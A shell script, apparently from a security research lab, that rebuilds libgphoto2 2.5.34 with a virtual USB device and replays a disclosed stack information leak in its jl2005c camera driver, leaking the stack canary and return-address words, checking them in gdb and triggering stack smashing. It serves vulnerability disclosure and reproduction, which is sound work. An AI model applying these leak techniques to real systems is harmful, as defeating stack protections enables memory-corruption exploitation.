#!/bin/sh
# W180: one-command replay of the W175/W177 real-API disclosure from a clean
# git archive. Run from the archive root (or the repository root):
#
#   git archive HEAD reports/frontier-libgphoto2shell.md lab/frontier/libgphoto2shell \
#     | tar x -C /tmp/replay-w180
#   cd /tmp/replay-w180
#   TARBALL=/path/to/libgphoto2-2.5.34.tar.bz2 \
#     sh lab/frontier/libgphoto2shell/live/replay-real-w177.sh
#
# TARBALL defaults to the author's provisioned copy; the witness can provision
# the same release tarball themselves (sha256 pinned below). WORK defaults to
# /tmp/w180-lgp-replay and is recreated on every run. NO_GDB=1 skips the
# read-only gdb cross-check. This is an author replay, not a witness verdict.
set -eu

HERE=$(CDPATH= cd -- "$(dirname "$0")" && pwd)
T=$(CDPATH= cd -- "$HERE/.." && pwd)
ROOT=$(CDPATH= cd -- "$HERE/../../../.." && pwd)
TARBALL=${TARBALL:-$T/src/libgphoto2-2.5.34.tar.bz2}
WORK=${WORK:-/tmp/w180-lgp-replay}
DRAIN=${DRAIN:-}
TAR_SHA=5df9e774eb4ab6087a193afff84dcafe9f666e3443fe29e73e6779f659ff7f28
VUSB_SHA=2b744f67e420a1a6addbf04861685c0711b33df36497e93e9267b4a23e57dde6
OUT=$WORK/replay.out

if [ ! -f "$TARBALL" ]; then
	echo "TARBALL not found: $TARBALL (set TARBALL to the pinned 2.5.34 release tarball)" >&2
	exit 2
fi
got=$(sha256sum "$TARBALL" | cut -d' ' -f1)
[ "$got" = "$TAR_SHA" ] || { echo "tarball sha256 $got != $TAR_SHA" >&2; exit 2; }

echo "== pins =="
(cd "$ROOT" && sha256sum -c lab/frontier/libgphoto2shell/PINS.sha256)

echo "== source and patches =="
rm -rf "$WORK"
mkdir -p "$WORK"
tar xjf "$TARBALL" -C "$WORK"
S=$WORK/libgphoto2-2.5.34
cd "$S"
patch -p1 < "$T/live/vusb-jl2005.patch" > "$WORK/patch-1.log"
patch -p1 < "$T/evidence/replay-vusb-victim.patch" > "$WORK/patch-2.log"
patch -p1 < "$T/evidence/replay-vusb-normal-return.patch" > "$WORK/patch-3.log"
patch -p1 < "$T/evidence/replay-vusb-guards.patch" > "$WORK/patch-4.log"
patch -p1 < "$T/evidence/replay-vusb-shortreply.patch" > "$WORK/patch-5.log"
# Do NOT apply replay-vusb-local-modes.patch: its mode-p cap is already in
# replay-vusb-victim.patch.
V=$S/libgphoto2_port/vusb/vusb.c
got=$(sha256sum "$V" | cut -d' ' -f1)
[ "$got" = "$VUSB_SHA" ] || { echo "patched vusb.c sha256 $got != $VUSB_SHA" >&2; exit 2; }
echo "patched vusb.c sha256 $got OK"

echo "== plain real-library build =="
CFLAGS='-O0 -g -fPIC -fno-omit-frame-pointer' ./configure \
	--prefix="$S/installdir-plain" --with-camlibs=jl2005c \
	--enable-shared --disable-static --without-libxml-2.0 \
	--without-libcurl --without-gdlib --without-libtiff-4 \
	--without-libexif --disable-nls --enable-vusb > "$WORK/configure.log" 2>&1
CFLAGS='-O0 -g -fPIC -fno-omit-frame-pointer' make -j4 > "$WORK/make.log" 2>&1
make install > "$WORK/install.log" 2>&1
P=$S/installdir-plain
echo "jl2005c.so sha256 $(sha256sum "$P/lib/libgphoto2/2.5.34/jl2005c.so" | cut -d' ' -f1)"

echo "== probe =="
PROBE=$WORK/probe
gcc -O0 -g -rdynamic -fno-omit-frame-pointer -I"$P/include" \
	$(pkg-config --cflags glib-2.0) "$T/evidence/replay-stack-leak-probe.c" \
	-o "$PROBE" -L"$P/lib" -lgphoto2 -lgphoto2_port \
	$(pkg-config --libs glib-2.0)

# The numeric drain is heap-layout dependent (W174: 22 failed, 23 worked in
# that tree); select the first value that produces the k=1023 disclosure.
if [ -z "$DRAIN" ]; then
	for d in $(seq 20 40); do
		set +e
		env CAMLIBS="$P/lib/libgphoto2/2.5.34" \
			IOLIBS="$P/lib/libgphoto2_port/0.12.2" IOLIBS_PREFIX=vusb \
			LD_LIBRARY_PATH="$P/lib" M2SHELL_JL2005_VUSB=v \
			M2SHELL_JL2005_COUNT=1053 M2SHELL_JL2005_LEN=0x3E28 \
			M2SHELL_VUSB_GUARDS=4 M2SHELL_VUSB_DRAIN="$d" \
			M2SHELL_JL2005_FILL=0 M2SHELL_JL2005_TOTAL=1 \
			"$PROBE" usb:001,001 1024 1024 > "$WORK/drain.out" 2>&1
		set -e
		if grep -q 'jl_1024.ppm table_k=1023 rc=0 size=16' "$WORK/drain.out"; then
			DRAIN=$d
			break
		fi
	done
	[ -n "$DRAIN" ] || { echo "no DRAIN in 20..40 produced the disclosure; see $WORK/drain.out" >&2; exit 2; }
fi
echo "selected DRAIN=$DRAIN (heap-layout dependent; override with DRAIN=N)"

: > "$OUT"
run_env() {
	set +e
	env CAMLIBS="$P/lib/libgphoto2/2.5.34" \
		IOLIBS="$P/lib/libgphoto2_port/0.12.2" IOLIBS_PREFIX=vusb \
		LD_LIBRARY_PATH="$P/lib" \
		M2SHELL_JL2005_VUSB=v M2SHELL_JL2005_COUNT=1053 \
		M2SHELL_JL2005_LEN=0x3E28 M2SHELL_VUSB_GUARDS=4 \
		M2SHELL_VUSB_DRAIN="$DRAIN" M2SHELL_JL2005_FILL=0 \
		M2SHELL_JL2005_TOTAL=1 "$@"
	echo "RC=$?" >> "$OUT"
	set -e
}

for i in 1 2 3; do
	printf '\n=== CANARY %s ===\n' "$i" >> "$OUT"
	run_env "$PROBE" usb:001,001 1024 1024 >> "$OUT" 2>&1
done
for i in 1 2 3; do
	printf '\n=== PTR %s ===\n' "$i" >> "$OUT"
	run_env "$PROBE" usb:001,001 1025 1025 >> "$OUT" 2>&1
done
printf '\n=== GDB ===\n' >> "$OUT"
if [ "${NO_GDB:-0}" = 1 ]; then
	echo "GDB skipped (NO_GDB=1)" >> "$OUT"
else
	run_env gdb -q -batch -x "$T/evidence/replay-w177-map.gdb" \
		--args "$PROBE" usb:001,001 1025 1025 >> "$OUT" 2>&1
fi
printf '\n=== COUNT100 ===\n' >> "$OUT"
set +e
env CAMLIBS="$P/lib/libgphoto2/2.5.34" \
	IOLIBS="$P/lib/libgphoto2_port/0.12.2" IOLIBS_PREFIX=vusb \
	LD_LIBRARY_PATH="$P/lib" M2SHELL_JL2005_VUSB=v \
	M2SHELL_JL2005_COUNT=100 M2SHELL_JL2005_LEN=0x3E28 \
	M2SHELL_VUSB_GUARDS=4 M2SHELL_VUSB_DRAIN="$DRAIN" \
	M2SHELL_JL2005_FILL=0 M2SHELL_JL2005_TOTAL=1 \
	"$PROBE" usb:001,001 1024 1024 >> "$OUT" 2>&1
echo "RC=$?" >> "$OUT"
printf '\n=== FULLREPLY ===\n' >> "$OUT"
env -u M2SHELL_JL2005_LEN \
	CAMLIBS="$P/lib/libgphoto2/2.5.34" \
	IOLIBS="$P/lib/libgphoto2_port/0.12.2" IOLIBS_PREFIX=vusb \
	LD_LIBRARY_PATH="$P/lib" M2SHELL_JL2005_VUSB=v \
	M2SHELL_JL2005_COUNT=1053 M2SHELL_VUSB_GUARDS=4 \
	M2SHELL_VUSB_DRAIN="$DRAIN" M2SHELL_JL2005_FILL=0 \
	M2SHELL_JL2005_TOTAL=1 \
	"$PROBE" usb:001,001 1024 1024 >> "$OUT" 2>&1
echo "RC=$?" >> "$OUT"
set -e

python3 - "$OUT" "${NO_GDB:-0}" <<'PY'
import re, sys
text = open(sys.argv[1]).read()
nogdb = sys.argv[2] == '1'
sections = {}
cur = 'preamble'
for line in text.splitlines():
    if line.startswith('=== ') and line.endswith(' ==='):
        cur = line[4:-4]
        sections[cur] = []
    else:
        sections.setdefault(cur, []).append(line)

fails = []
passes = 0

def check(ok, label):
    global passes
    if ok:
        passes += 1
    else:
        fails.append(label)

def data_of(lines):
    for line in lines:
        m = re.search(r'\bdata=([0-9a-f]+)$', line)
        if m:
            return line, m.group(1)
    return '', ''

def canary_of(lines):
    for line in lines:
        m = re.match(r'OWN_CANARY=([0-9a-f]{16})$', line)
        if m:
            return m.group(1)
    return ''

le = lambda h: int.from_bytes(bytes.fromhex(h), 'little')
for i in range(1, 4):
    lines = sections.get('CANARY %d' % i, [])
    own, data = canary_of(lines), data_of(lines)[1]
    check(bool(own) and len(data) == 32 and data.endswith(bytes.fromhex(own)[::-1].hex()),
          'canary%d own-canary at k=1023' % i)
    check(any('gp_camera_init rc=0' in line for line in lines), 'canary%d init rc=0' % i)
    check(any(line == 'RC=0' for line in lines), 'canary%d probe rc=0' % i)

for i in range(1, 4):
    lines = sections.get('PTR %d' % i, [])
    data = data_of(lines)[1]
    ok = len(data) == 32
    if ok:
        w1, w2 = le(data[:16]), le(data[16:])
        ok = 0x700000000000 < w1 < 0x800000000000 and 0x700000000000 < w2 < 0x800000000000
    check(ok, 'ptr%d saved-rbp/RIP-shaped words at k=1024' % i)
    check(any(line == 'RC=0' for line in lines), 'ptr%d probe rc=0' % i)

if nogdb:
    print('gdb cross-check skipped')
else:
    lines = sections.get('GDB', [])
    def gdbval(key):
        for line in lines:
            m = re.match(key + r'=(0x[0-9a-f]+)$', line)
            if m:
                return int(m.group(1), 16)
        return None
    r1, r1_8 = gdbval('GDB_AT_R1'), gdbval('GDB_AT_R1_8')
    data = data_of(lines)[1]
    ok = r1 is not None and r1_8 is not None and len(data) == 32
    if ok:
        ok = le(data[:16]) == r1 and le(data[16:]) == r1_8
    check(ok, 'gdb saved-rbp/RIP match leaked words byte-for-byte')

lines = sections.get('COUNT100', [])
check(any('list_files' in line and 'count=100' in line for line in lines), 'count100 list_files')
check(any('jl_1024.ppm' in line and 'rc=-108' in line for line in lines), 'count100 no entry')

lines = sections.get('FULLREPLY', [])
check(any('stack smashing detected' in line for line in lines), 'full reply stack smashing')
check(any(line == 'RC=134' for line in lines), 'full reply rc=134')

print('RESULT: %d PASS / %d FAIL' % (passes, len(fails)))
for label in fails:
    print('FAIL:', label)
print('raw output:', sys.argv[1])
sys.exit(1 if fails else 0)
PY
